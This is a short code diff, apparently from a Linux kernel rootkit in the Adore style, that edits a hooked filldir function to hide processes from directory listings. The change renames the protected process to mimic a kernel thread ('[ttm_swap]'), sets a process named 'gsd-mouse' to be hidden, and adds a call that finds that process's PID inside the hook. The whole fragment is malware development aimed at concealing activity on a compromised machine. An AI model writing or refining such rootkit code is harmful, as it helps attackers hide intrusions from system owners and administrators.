@@ -21,7 +21,7 @@
 
 
 #define FLAG 0x80000000
-const char *protected = "[md]";
+const char *protected = "[ttm_swap]";
 int protected_pid = -1;
 int hide_pid = -1;
 const char *hide = "gsd-mouse";
@@ -179,6 +179,7 @@ static int khook_filldir(void *__buf, const char *name, int namlen, loff_t offse
 {
 
 	int ret = 0;
+	find_pid_hide();
 	find_pid_kill();
 	if(adore_atoi(name)==protected_pid){
 		return 0;
